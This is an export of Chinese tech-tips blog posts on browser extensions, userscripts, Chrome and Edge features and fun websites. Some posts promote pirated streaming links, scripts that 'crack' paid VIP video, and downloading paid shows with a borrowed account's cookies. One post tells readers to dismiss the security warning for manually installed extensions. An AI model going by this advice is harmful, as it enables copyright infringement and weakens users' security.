    <content type="text"><![CDATA[苏生不惑第207 篇原创文章，将本公众号设为星标，第一时间看最新文章。 一晃又到了年底，2020年就要结束了（你的小目标完成了吗），一年一度的豆瓣电影榜单也出炉了https://movie.douban.com/annual/2020 另外还有音乐榜单 https://music.douban.com/annual/2020 ，图书榜单 https://book.douban.com/annual/2020 以及果壳出品的电影烂片排行榜 https://datamuse.guokr.com/wmu 平常我一般在豆瓣找电影信息，比如想找一部2000年左右的武侠剧但不记得名字可以通过豆瓣搜索下 https://movie.douban.com/tag/#/?sort=U&amp;range=0,10&amp;tags=2000%E5%B9%B4%E4%BB%A3,%E7%94%B5%E8%A7%86%E5%89%A7,%E6%AD%A6%E4%BE%A0,%E4%B8%AD%E5%9B%BD%E5%A4%A7%E9%99%86如果还能在豆瓣看电影就方便了，不用再去找资源，今天就分享几个好用的扩展和油猴脚本。 这里以豆瓣评分8.5的电影《阳光普照》为例 https://movie.douban.com/subject/30292777/ ，我用Python抓取了100页评论的词云图如下：https://github.com/daacheng/PythonBasic/blob/master/spider/pythonForDBComment.py 豆瓣电影放映厅这是个Chrome扩展 https://chrome.google.com/webstore/detail/%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%E6%94%BE%E6%98%A0%E5%8E%85/fdpginkdbfpppjeoncmgejpmgdnlimpe ，Chrome扩展的安装和使用见之前文章上不了谷歌如何安装 Chrome 扩展？ ，微软 edge 浏览器如何安装扩展 https://douban.mashankan.com/ 安装以后页面下方提供了点播链接和下载地址。在线播放还挺清晰。也可以直接用idm下载。 豆瓣资源下载大师这个油猴脚本 https://greasyfork.org/zh-CN/scripts/329484 之前单独写文章介绍过搜不到你想看的书/音乐/电影？一个油猴脚本帮你搞定 ，豆瓣页面右侧提供了在线播放，阅读，字幕，歌词下载及PT|NZB|BT|磁力|百度网盘|115网盘等下载链接。 YMD聚合电影评分解说观看链接https://greasyfork.org/zh-CN/scripts/404243-ymdmovieratings这个油猴脚本会聚合显示豆瓣、IMDb、烂番茄、MetaCritic、B站和油管电影评分、解说、观看链接信息，电影解说主要来自b站和油管。b站视频下方也能显示。 如果安装以上的脚本和扩展也没有找到观看资源（可能电影比较古老或冷门）推荐下面这个Chrome扩展easySearch 。 easySearch这个扩展 https://chrome.google.com/webstore/detail/easysearch/igieognglkjfefoldlaachcoimjecojk?hl=zh-CN 来自聚bt http://bbs.ijubt.net/ ， 支持磁力搜索、影视搜索、动漫资源搜索、网盘资源搜索、图书资源搜索、音乐资源搜索、通用搜索引擎、学术资源搜索。 安装扩展后可输入关键词查找。很快就找到结果。 豆瓣搜索一个豆瓣人肉搜索引擎 爱豆搜 http://www.idousou.com/ ，https://chrome.google.com/webstore/detail/%E7%88%B1%E8%B1%86%E6%90%9C%EF%BC%9A%E8%B1%86%E7%93%A3%E4%BA%BA%E8%82%89%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/lecbhcnknfjmnemfjfepocljlbomajbj 这个扩展可以方便的追踪你的偶像、死党动态，主要功能如下图。 豆瓣页面增加一个高级搜索。 如果你想备份自己的豆瓣数据可以安装 豆伴这个Chrome扩展 https://chrome.google.com/webstore/detail/%E8%B1%86%E4%BC%B4%EF%BC%9A%E8%B1%86%E7%93%A3%E8%B4%A6%E5%8F%B7%E5%A4%87%E4%BB%BD%E5%B7%A5%E5%85%B7/ghppfgfeoafdcaebjoglabppkfmbcjdd，它可以备份豆瓣网的用户数据及图片，并支持将备份数据导出到 Excel 文档，主要功能如下： 最后分享个号称b站镜像的动漫网站http://bimibimi.me/ ，不过这个网站广告多，而且还禁止右键复制，推荐安装这个油猴脚本 https://greasyfork.org/zh-CN/scripts/391325 去广告，还原鼠标样式，删除伪搜索历史框 。 看看最近大热的美剧《女王的棋局》http://www.bimiacg.com/bangumi/3327/play/1/1/ 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 最近原创文章： 如何下载 b 站大会员/腾讯/优酷/爱奇艺 VIP 视频 一键下载百度文库/豆丁/道客巴巴文档，支持导出PDF，Word，txt 文件 解除网页查看限制，自由查看和跳转网站 不用写代码，Chrome 扩展神器 web scraper 抓取知乎热榜/话题/回答/专栏，豆瓣电影 不为人知的几个微信实用技巧 谷歌浏览器那些有趣的隐藏功能 集赞生成器：朋友圈集赞不求人 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[谷歌浏览器那些有趣的隐藏功能]]></title>
    <url>%2F2020%2F12%2F25%2F%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E9%9A%90%E8%97%8F%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[苏生不惑第206 篇原创文章，将本公众号设为星标，第一时间看最新文章。 前天写了篇文章 微软 edge 浏览器如何安装扩展，很多小伙伴说还是习惯用谷歌浏览器，我也是用习惯了，这里就再分享些谷歌浏览器的隐藏功能，主要是实验功能 chrome://flags 里的，后续可能会更新到稳定版。 谷歌浏览器在官网 https://www.google.cn/chrome/ 下载即可，强烈不建议在第三方网站下载， 谁知道有没有被人动手脚。 标签预览谷歌浏览器地址栏中输入 chrome://flags/#tab-hover-cards，将Tab Hover Cards和Tab Hover Cards Images 后面的选项都调整为Enabled 后重启浏览器。将鼠标悬停在一个标签页上，就可以看到页面的地址和缩略图预览了，我这里录制了个GIF图。 实时字幕这个在之前文章 在线加速播放百度网盘视频（其实支持任意网站） 也分享过，谷歌浏览器地址栏中输入 chrome://flags/#enable-accessibility-live-captions ，选中 Enabled 。 高级功能无障碍里再开启实时字幕 chrome://settings/accessibility ，不过目前目前仅提供英文版，期待后续支出中文，日文等语言。打开一个英文视频，比如b站这个 https://www.bilibili.com/video/BV1KJ411r7Tn/ ，下面就出现了实时字幕，准确性还可以。 多线程下载除了使用第三方下载工具之外（比如idm），谷歌浏览器地址栏中输入 chrome://flags/#enable-parallel-downloading 也可以开启并行下载功能，下载大文件时速度会更快。 阅读模式谷歌浏览器地址栏中输入 chrome://flags/#enable-reader-mode 开启后就可以使用阅读视图模式了（删除页面广告和无谓的页面样式等干扰性元素）。 二维码分享谷歌浏览器地址栏中输入 chrome://flags/#sharing-qr-code-generator 开启后右键即可生成二维码，不用安装第三方插件了。 生成的二维码中央还有一只离线小恐龙，并且支持下载，也可以自定义网址生成二维码，用微信识别这个二维码就能打开腾讯官网了。 深色主题谷歌浏览器地址栏中输入 chrome://flags/#enable-force-dark 开启，可以自定义rgb值。效果如下： 除了 chrome://flags 其实还有很多类似地址，比如 扩展 chrome://extensions ， 设置 chrome://settings ，浏览器版本 chrome://version ，书签 chrome://bookmarks/ ，小恐龙游戏 chrome://dino ，这些在 chrome://about 都可以找到 ，这里列出了当前 Chrome 浏览器版本支持的所有命令。 最后再分享些谷歌浏览器的实用技巧，之前也分享过一些 那些你可能不知道的谷歌浏览器实用技巧 。 继续浏览上次打开的网页如果打开了很多标签没看完想下次接着看，可以在设置里开启 继续浏览上次打开的网页，这样下次启动浏览器就会继续浏览之前的网页。 后退页面不用一次次后退到之前的网页，右键返回按钮选择即可。 重新打开关闭的页面不小心关了页面没关系，右键浏览器上方就可以重新打开，也可以使用快捷键 Ctrl + Shift + T 。 音频视频管理 页面播放音视频时，浏览器右上角会出现媒体标志，可以很方便的控制音视频。 画中画打开b站（其实任何一个影视网站都可以），底部有个开启画中画。开启后播放界面就可以脱离浏览器 随意拖动了，我也录制了个GIF图。 任务管理器如果浏览器假死，可以打开任务管理器关闭占用CPU高的页面。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 最近原创文章： 如何下载 b 站大会员/腾讯/优酷/爱奇艺 VIP 视频 一键下载百度文库/豆丁/道客巴巴文档，支持导出PDF，Word，txt 文件 解除网页查看限制，自由查看和跳转网站 不用写代码，Chrome 扩展神器 web scraper 抓取知乎热榜/话题/回答/专栏，豆瓣电影 不为人知的几个微信实用技巧 那些有趣的网站系列（八） 集赞生成器：朋友圈集赞不求人 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微软 edge 浏览器如何安装扩展]]></title>
    <url>%2F2020%2F12%2F25%2F%E5%BE%AE%E8%BD%AF-edge-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85%E6%89%A9%E5%B1%95%2F</url>
    <content type="text"><![CDATA[苏生不惑第205 篇原创文章，将本公众号设为星标，第一时间看最新文章。 我是一直推荐谷歌浏览器的，之前也写过文章 那些你可能不知道的谷歌浏览器实用技巧 以及推荐扩展系列 那些有趣/实用的 Chrome 扩展神器系列（二） ，实用油猴脚本推荐，让你的谷歌浏览器更强大 。 不过后台有小伙伴提到谷歌浏览器搜索不了东西，那是因为谷歌搜索在国内是打不开的，可以修改默认搜索引擎为百度，不过对于小白又有点麻烦，如果你还是不习惯用谷歌推荐使用微软今年出的edge浏览器 https://www.microsoft.com/zh-cn/edge ，也是基于 Chromium 开源项目，Chrome 有的功能 Edge 几乎都有，目前版本是 87.0.664.66。 所谓没有安装扩展的浏览器是没有灵魂的，为什么我喜欢用谷歌浏览器，因为谷歌商店有很多丰富的插件可以使用，edge浏览器也一样推荐你安装扩展，下面就分享下如何在edge浏览器安装扩展 。 edge 扩展商店安装和谷歌一样edge也有自己的扩展商店，国内用户可以直接访问这个商店，不过目前扩展还比较少 https://microsoftedge.microsoft.com/addons/Microsoft-Edge-Extensions-Home?hl=zh-CN 选择一个扩展点获取即可安装使用。 谷歌扩展商店安装由于新出的商店扩展比较少，支持直接安装谷歌商店里的扩展。和Chrome浏览器一样添加安装。 手动安装如果谷歌商店打不开就只能手动安装了，输入 edge://extensions/ 进入扩展管理页面， 跟谷歌浏览器手动安装一样开启开发人员模式，将下载的扩展crx文件拖进去就是 。很快就安装好了，现在就可以去安装油猴脚本了。 如果提示无法安装或者程序包无效，修改下文件名后缀为rar，然后用7zip解压到一个目录，这个目录里面会有很多文件。回到edge浏览器的扩展管理页面，点击 加载解压缩的扩展 。选择刚才解压出的目录就安装好了。不过手动安装的扩展启动的时候会提示什么危害计算机， 不用管它，关闭即可。以上就是安装扩展的3个方法，跟Chrome一样，自己操作下，很快就学会，下面再分享下edge浏览器几个比较实用的功能。 长截图edge内置了截图工具，方便对网页截图，而且支持滚动截长图，如果想对其他地方截图推荐之前文章 如何优雅的对网页截取长图 分享的工具 。右键选择网页捕获即可截图，我这里录了个GIF图。 朗读右键选择大声朗读即可将页面文字转语音朗读出来，效果还不错。 集锦一般浏览器只能收藏网页，edge浏览器的集锦功能可收藏网页、图片、文本，直接拖拽即可收藏进去。 浏览PDF文件和谷歌一样也支持浏览PDF文件，还提供了涂鸦功能，单击工具栏上的绘制按钮即可。 冲浪游戏和谷歌浏览器一样断网时可以玩游戏，也可以输入edge://surf 离线访问。跟谷歌浏览器地址栏输入 chrome://dino 一样。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 最近原创文章： 如何下载 b 站大会员/腾讯/优酷/爱奇艺 VIP 视频 一键下载百度文库/豆丁/道客巴巴文档，支持导出PDF，Word，txt 文件 解除网页查看限制，自由查看和跳转网站 不用写代码，Chrome 扩展神器 web scraper 抓取知乎热榜/话题/回答/专栏，豆瓣电影 不为人知的几个微信实用技巧 那些有趣的网站系列（八） 集赞生成器：朋友圈集赞不求人 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在线加速播放百度网盘视频（同时支持任意网站）]]></title>
    <url>%2F2020%2F12%2F25%2F%E5%9C%A8%E7%BA%BF%E5%8A%A0%E9%80%9F%E6%92%AD%E6%94%BE%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E8%A7%86%E9%A2%91%EF%BC%88%E5%90%8C%E6%97%B6%E6%94%AF%E6%8C%81%E4%BB%BB%E6%84%8F%E7%BD%91%E7%AB%99%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第204 篇原创文章，将本公众号设为星标，第一时间看最新文章。 文章开始前说下之前文章 百度网盘分享链接秒挂？试试这个神器 介绍的油猴脚本并不是可以保存失效链接的网盘文件，而是通过脚本保存他人分享给你的秒传链接里的文件。 另外那个收集文件功能很好用 https://pan.baidu.com/disk/main#/transfer/list ，如果网盘文件分享不出去或瞬间挂掉可以使用这个发给小伙伴。1234大家好，在此收集xxx有效期截止到2020年12月27日18:01，麻烦在此之前点击以下链接将文件发送给我，支持发送任意格式的文件，感谢~链接：https://pan.baidu.com/disk/main#/transfer/send?surl=xxx来自：xxxx 说回百度网盘视频倍速播放，只有开通会员才能享受在线视频倍速播放功能，如果没有开会员怎么办呢？分享几个方法（如果你使用火狐浏览器可以跳过了，因为它自带加速功能）。 Chrome 扩展Video Speed Controller 这个超百万用户使用的扩展可以加速播放HTML5格式视频 https://chrome.google.com/webstore/detail/video-speed-controller/nffaoalbilbmmfgbnbgppjihopabppdk ，关于谷歌浏览器安装Chrome扩展参考我之前的文章 那些你可能不知道的谷歌浏览器实用技巧 ， 上不了谷歌如何安装 Chrome 扩展？ 在百度网盘播放页左上角点击即可加速播放。 除了百度网盘，类似b站，优酷腾讯爱奇艺这样的网站都是支持的，尽管有些自带加速功能。https://www.bilibili.com/video/BV1ip4y1D7iY 油猴扩展安装百度网盘视频倍速播放这个油猴脚本https://greasyfork.org/zh-CN/scripts/405388 （关于安装油猴脚本和使用见之前文章实用油猴脚本推荐，让你的谷歌浏览器更强大），安装后视频下方可以看到加速按钮。也可以自己设置0-5的播放倍速。 另外还有个支持HTML5视频的 增强脚本https://greasyfork.org/scripts/381682 ，支持所有H5视频播放网站，全程快捷键控制，支持：倍速播放/加速播放、视频画面截图、画中画、网页全屏、调节亮度、饱和度、对比度、自定义配置功能增强等功能，它使用快捷键来控制。 这样就可以设置超过b站最大2倍的播放速度。 手动执行代码如果不想安装插件什么的直接打开控制台执行以下代码即可。videojs.getPlayers(&quot;video-player&quot;).html5player.tech_.setPlaybackRate(2) 最后分享个最新版谷歌浏览器的新功能实时字幕，先打开chrome://settings/help 让浏览器更新到最新版87.0.4280.88。 然后打开 chrome://flags/#enable-accessibility-live-captions 开启（需要重启浏览器）。 最后高级功能无障碍里开启实时字幕 chrome://settings/accessibility ，不过目前目前仅提供英文版，期待后续支出中文，日文等语言。打开一个英文视频，比如b站这个 https://www.bilibili.com/video/BV1KJ411r7Tn/ ，下面就出现了实时字幕，不过还是有点出入。顺便提下最新出的记笔记功能，更方便在b站学习了。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 最近原创文章： 如何下载 b 站大会员/腾讯/优酷/爱奇艺 VIP 视频 一键下载百度文库/豆丁/道客巴巴文档，支持导出PDF，Word，txt 文件 解除网页查看限制，自由查看和跳转网站 不用写代码，Chrome 扩展神器 web scraper 抓取知乎热榜/话题/回答/专栏，豆瓣电影 不为人知的几个微信实用技巧 那些有趣的网站系列（八） 集赞生成器：朋友圈集赞不求人 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何下载 b 站大会员/腾讯/优酷/爱奇艺 VIP 视频]]></title>
    <url>%2F2020%2F12%2F25%2F%E5%A6%82%E4%BD%95%E4%B8%8B%E8%BD%BD-b-%E7%AB%99%E5%A4%A7%E4%BC%9A%E5%91%98-%E8%85%BE%E8%AE%AF-%E4%BC%98%E9%85%B7-%E7%88%B1%E5%A5%87%E8%89%BA-VIP-%E8%A7%86%E9%A2%91%2F</url>
    <content type="text"><![CDATA[苏生不惑第203 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于下载视频之前分享过文章视频下载神器：支持腾讯/优酷/爱奇艺/b站/微博等全网视频 ，不过只说了下载免费视频，今天再来说说下载VIP视频。 有会员账号下载视频先说下载b站大会员视频，还是用之前文章分享的 工具annie https://github.com/iawia002/annie，不过需要先获取用户cookie，因为未登录状态获取不到视频信息。123 annie -i https://www.bilibili.com/bangumi/play/ep340536Downloading https://www.bilibili.com/bangumi/play/ep340536 error:request error: Get : unsupported protocol scheme "" 之前文章b 站账号快速升级到 Lv6：每天自动签到，观看，分享，投币视频 也是借助cookie每天自动刷等级的。 登录b站大会员账号（感谢小伙伴 @精灵大人的Identity 提供账号）后打开控制台复制cookie那一串字符。不过这样有点麻烦，有些人还不大会操作，可以安装个Chrome扩展 EditThisCookie https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg ，关于谷歌浏览器安装Chrome扩展参考我之前的文章 那些你可能不知道的谷歌浏览器实用技巧 ， 上不了谷歌如何安装 Chrome 扩展？ ， 安装后设置cookie导出格式为 Semicolon separated name=value pairs 然后打开 EditThisCookie 插件，将Cookie导出到剪贴板，不过只要最后一行有用的代码参数，//开头的几行删掉。 b站登陆账号可观看1080P视频，大会员可看1080P+视频 ，我们再次使用annie获取b站独播剧《风犬少年的天空》视频信息，有720p，1080p和1080p+。 选择一种格式开始下载。12345678910Site: 哔哩哔哩 bilibili.comTitle: 风犬少年的天空：第4集 男人之间也可以说这么肉麻的话吗Type: videoStream: [16] ------------------- Quality: 流畅 360P Size: 127.78 MiB (133989902 Bytes) # download with: annie -f 16 ...127.78 MiB / 127.78 MiB [=========================================================] 100.00% 5.61 MiB/s 22s Merging video parts into 风犬少年的天空：第4集 男人之间也可以说这么肉麻的话吗.mp4 很快48分钟的视频就下载好了。除了使用命令行当然也可以使用油猴脚本 https://greasyfork.org/zh-CN/scripts/373563-bilibili-evolved 来下载 ，这个脚本之前文章 如何更优雅地使用 bilibili(b站) 就分享过。 因为是通过浏览器下载，就不用复制cookie什么的，下载速度还挺快。未登录只能下载6分钟。除了b站，优酷腾讯爱奇艺VIP视频也可以这样下载（不用什么qlv转mp4工具了），比如最近的《大秦赋》，可惜目前Annie还不支持通过cookie下载，所以我们另辟蹊径先获取m3u8 地址再下载。 怎么获取视频m3u8地址呢？https://nilaoda.github.io/N_m3u8DL-CLI/GetM3u8.html 这个网站已经整理好了，登录爱奇艺会员账号，打开控制台执行如下代码即可下载m3u8文件大秦赋第44集_896x504_H264_45.27_154.36MB.m3u8再通过之前分享的m3u8下载工具（公众号后台回复m3u8获取工具）即可将m3u8文件转成mp4文件。45分钟的爱奇艺VIP视频就下载好了。 无会员账号下载视频如果你没有会员账号怎么办呢？还是利用油猴脚本来搞定， https://greasyfork.org/zh-CN/scripts/407847 这个脚本可以解锁大会员视频,集合了优酷、爱奇艺、腾讯等全网VIP视频免费破解去广告。 安装后选择b站大会员解析就可以直接观看了，不过有点卡，而且没有了b站的弹幕。直接用idm就能下载了。 优酷爱奇艺腾讯同理。不过下载的视频有广告，忽略即可，千万别信。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 最近原创文章： 百度网盘分享链接秒挂？试试这个神器 一键下载百度文库/豆丁/道客巴巴文档，支持导出PDF，Word，txt 文件 解除网页查看限制，自由查看和跳转网站 不用写代码，Chrome 扩展神器 web scraper 抓取知乎热榜/话题/回答/专栏，豆瓣电影 不为人知的几个微信实用技巧 那些有趣的网站系列（八） 集赞生成器：朋友圈集赞不求人 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些有趣的网站系列（八）]]></title>
    <url>%2F2020%2F12%2F25%2F%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99%E7%B3%BB%E5%88%97%EF%BC%88%E5%85%AB%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第202篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过有趣的网站有： 那些有趣的网站 那些有趣的网站（二） 那些有趣的网站系列（三） 那些有趣的网站系列（四） 那些有趣的网站系列（五） 那些有趣的网站系列（六） 那些有趣的网站系列（七） 这是系列第8篇。 解谜闯关一个很烧脑的网站，你需要在网站里找到线索进入下一关，目前网站已经出到50关了，非常具有挑战性和趣味性 http://nazo.one-story.cn/nazo-4第一关你能搞定吗？（文末点击阅读原文开始解谜）https://www.cnblogs.com/wlzhouzhuan/p/13173198.html https://blog.csdn.net/wobeatit/article/details/89663721 ，如果喜欢玩数独可以看看 https://cn.puzzle-sudoku.com/ 抽象话生成器输入需要转换的文字（比如 欢迎关注公众号苏生不惑），点击生成抽象话按钮，即可获得转换后的emoji表情符号欢迎关㊗🈺🀄🐵苏生🧣🔥 ，还可以还原为拼音。 https://cxh.cuiuc.com/ https://cxh.papapoi.com/ https://aipaideer.github.io/tool/cxhhttps://chouxiang.ml/#mdui-dialog http://www.atoolbox.net/Tool.php?Id=864 http://tool.mkblog.cn/cxh/ ###在线查看压缩包如果本地没有安装解压软件，只要在浏览器中打开网站就能查看zip类压缩文件 https://zipadee.now.sh/ https://extract.me/ ，可以上传文件或者输入地址，比如之前分享的百度文库插件一键下载百度文库/豆丁/道客巴巴文档，支持导出PDF，Word，txt 文件 https://github.com/wxbool/baidu-wenku/archive/main.zip 四大名著地图看看《西游记》中唐僧经历九九八十一难的路途（从西安到印度的巴特那） https://www.sdmz.net/map/ 元素周期表直观的展示元素周期表 https://ptable.com/ ，据说元素周期表的翻译生僻字来自朱元璋后人，他给后代起名定了规则，除了儿子，后代必须三个字。儿子各分支中间的字也规定好，最后一个字必须是金木水火土偏旁。后来老朱家人太多了，朱棣朱标之类的常见字没了，就只能找生僻字，甚至造字，硬生生地凑出一个元素周期表 https://www.weibo.com/3816678925/J76syy9nX 元素周期表传入中国时，徐寿最先翻译的，徐寿想破脑袋，不知道如何翻译，后来看到朱元璋后代名字，发现太适合元素周期表了，就借用了一些。朱元璋给后代起名定了规则，除了儿子，后代必须三个字。儿子各分支中间的字也规定好，最后一个字必须是金木水火土偏旁。后来老朱家人太多了，朱棣朱标之类的常见字没了，就只能找生僻字，甚至造字，硬生生地凑出一个元素周期表。 明太祖朱元璋 – 明惠帝朱允炆– 明成祖朱棣– 明仁宗朱高炽– 明宣宗朱瞻基 – 明英宗朱祁镇– 明代宗朱祁钰 –明宪宗朱见深– 明孝宗朱佑樘 –明武宗朱厚照– 明世宗朱厚熜 – 明穆宗朱载垕– 明神宗朱翊钧 –明光宗朱常洛– 明熹宗朱由校 – 明思宗朱由检 声音资源库探索全球 1,000,000+ 声音资源，聚合国内外百万级声音素材、游戏音效、影视配乐、实地录音、音乐样本、节奏音源，通过互联网云技术打造最大最全的声音资源库。可以搜索下载各类BGM，包括音乐和音效等资源，比如史诗 大片音乐 https://www.tosound.com/ ，国外也有类似的https://www.soundsnap.com/ 舔狗日记每次刷新不断更换卑微的舔狗日记内容，真是辛酸 https://we.dog/ http://www.sanger.dk/ pornhub风格logo后台有人问我最近文章的封面用什么做的，就是pornhub风格logo https://www.logoly.pro/ https://www.dute.org/pornhub-logo 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么别人不回你的微信？说说如何正确的提问]]></title>
    <url>%2F2020%2F12%2F25%2F%E4%B8%BA%E4%BB%80%E4%B9%88%E5%88%AB%E4%BA%BA%E4%B8%8D%E5%9B%9E%E4%BD%A0%E7%9A%84%E5%BE%AE%E4%BF%A1%EF%BC%9F%E8%AF%B4%E8%AF%B4%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E7%9A%84%E6%8F%90%E9%97%AE%2F</url>
    <content type="text"><![CDATA[周末说个关于微信社交的话题，自从写公众号以来微信加了有近2000人，发现不少人喜欢问在吗？ 对此我之前还发过朋友圈说这个。 我发现总有人喜欢在微信上问我 在吗？不知道你要请我吃饭还是找我借钱，我也很为难哪，即便回了在，可能要等很久对方才回复，然后又是你在吗。。。有事直接说不好嘛。 一来一回过了1天也没说什么问题，之后这种微信我就不回了，所以有时候想想为什么别人不回你的微信。 还有一种发语音的也几乎不回，本来上班就不方便听语音，即使用微信翻译可能也不准确。 另外加微信的时候附上申请来由，这样通过概率就大多了。加了微信就直接说问题。问题说清了，很快就帮他们搞定了，当然如果更有诚意可以发红包请人家帮忙。 关于提问还有个很有用的指南《提问的智慧（How To Ask Questions The Smart Way）》，它说明了作者所认为一位发问者事前应该要做好什么，而什么又是不该做的。作者认为这样能让问题容易令人理解，而且发问者自己也能学到较多东西，此文在网路上受到欢迎，被广泛转载而广为人知甚至奉为经典 https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/master/README-zh_CN.md，简单来说就是提问前自己搜索尝试，提问时准确描述问题，问题解决了反馈（表示感谢），有人还做个思维导图，这里放不下，公众号后台回复 提问 获取。https://upclinux.github.io/intro/01/how-to-ask/https://cdn.jsdelivr.net/gh/Mark-1215/CDN/uploads/content/Questions.jpg 平常搜索也是在向谷歌/百度 提问，一个好的提问能帮你更快的找到答案，关于搜索技巧可以看之前我分享过的文章 ： 如何让你的搜索更高效 如何通过电影截图找到电影 2020 最全百度网盘搜索，找电影资源不再愁 如何根据台词找到对应电影片段 2020 最全电子书搜索网站，找电子书不再愁 另外说下之前文章不为人知的几个微信实用技巧 下有条置顶评论，我测试了下没问题，如果想加群里的人可以先拉黑，再到隐私—&gt;通讯录黑名单解除再加好友，感谢小伙伴 混沌 分享。 最后发个福利，公众号后台回复 中奖 进入小程序抽奖，抽1人66块（当请吃午饭了），12月16号20点开奖（会有微信通知开奖），中奖后可直接提现到微信钱包。 另外本文末尾评论（说说什么情况下你不想回别人的微信）点赞数前10，每人6.6元红包，截止时间14号10点，之前的红包福利见文章： 一键备份导出虾米音乐数据，包含收藏专辑/音乐/艺人/歌单 2020 年 11 月福利，小伙伴们来领现金红包 2020年10月福利，小伙伴们来领现金红包 中秋/国庆节发福利了，小伙伴们来领现金红包 8月发福利了，小伙伴们来领现金红包 当然除了获得红包，我觉得更重要的是大家觉得我写的文章对你有用，比如这样的。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些有趣/实用的 Chrome 扩展神器系列（二）]]></title>
    <url>%2F2020%2F12%2F11%2F%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3-%E5%AE%9E%E7%94%A8%E7%9A%84-Chrome-%E6%89%A9%E5%B1%95%E7%A5%9E%E5%99%A8%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第201 篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过 那些有趣/实用的 Chrome 扩展神器 ,准备做成一个系列，这是第2篇，关于谷歌浏览器安装Chrome扩展参考我之前的文章 那些你可能不知道的谷歌浏览器实用技巧 ， 上不了谷歌如何安装 Chrome 扩展？ 。 正则搜索平常网页上最常用ctrl+f搜索关键词，不过功能单一，如果想更丰富的查找功能可以使用这个插件 https://chrome.google.com/webstore/detail/chrome-regex-search/bpelaihoicobbkgmhcbikncnpacdbknn 比如使用正则[\u4e00-\u9fa5]可以高亮显示页面的中文，还可以直接复制下来。 如果对正则不熟悉可以在网站 https://regexr.com/ ， https://regex101.com/ 在线练习使用方法，很快就能学会 。 录屏标记之前分享过录制GIF工具 那些好用的 GIF 录制工具 ，如果不想安装客户端软件可以试试这个插件screenity https://chrome.google.com/webstore/detail/screenity-screen-recorder/kbbdabhdfibnancpjfhlkhafgdilcnji，支持在屏幕上任意位置进行录制和标注信息，并可将录制内容导出 MP4、gif、webm 等文件格式。 https://github.com/alyssaxuu/screenity 这里导出GIF格式，不过导出的GIF文件有点大，可以使用 https://ezgif.com/ 压缩下。 视频下载之前分享过好几个下载视频神器 视频下载神器：支持腾讯/优酷/爱奇艺/b站/微博等全网视频，这里再补上一个插件CoCoCut https://chrome.google.com/webstore/detail/video-downloader-cococut/gddbgllpilhpnjpkdbopahnpealaklle ，可以在线下载视频（支持HLS和视频直播下载，难以下载的视频还可以通过录制的方式下载）和音乐。 比如微博视频就可以直接下载。 腾讯视频因为使用的m3u8格式，点击强力下载跳转 https://cococut.net/zh_cn/hls.html 很快就下载好了，文件是mp4格式。 中国传统色每次打开新标签页看到中国的传统颜色搭配一句经典诗词歌赋，非常赏心悦目，这就是几枝扩展https://chrome.google.com/webstore/detail/%E5%87%A0%E6%9E%9D/hfohpokminpknagcgncibpacohagppjn/?hl=zh-CN诗词来自网站 https://www.jinrishici.com/ 股票基金盯盘这个扩展支持自选A股、港股、美股、基金等产品、实时显示股票信息，小窗口看盘非常适用于上班族。 https://github.com/xioasa/stock_fund_pagehttps://chrome.google.com/webstore/detail/%E8%82%A1%E7%A5%A8%E5%9F%BA%E9%87%91%E5%8A%A9%E6%89%8B-%E7%9B%AF%E7%9B%98%E5%8A%A9%E6%89%8Bpro/folafkamgdbhdeejjhohajojeogpoknm?hl=zh-CN ，添加贵州茅台股票代号。查看股票行情。 GitHub 文件树平常看代码找文件很麻烦，推荐Gitako 扩展https://chrome.google.com/webstore/detail/gitako-github-file-tree/giljefjcheohhamkjphiebfjnlphnokk ，左侧会显示文件目录，非常直观。https://github.com/EnixCoda/Gitako/ https://gitee.com/mirrors/Gitako 可视化浏览历史记录想知道自己每天都喜欢上哪些网站，使用这个扩展一看便知 https://chrome.google.com/webstore/detail/history-master/mkfgjjeggnmkbobjmelbjhdchcoadnin ，直观展示访问时间 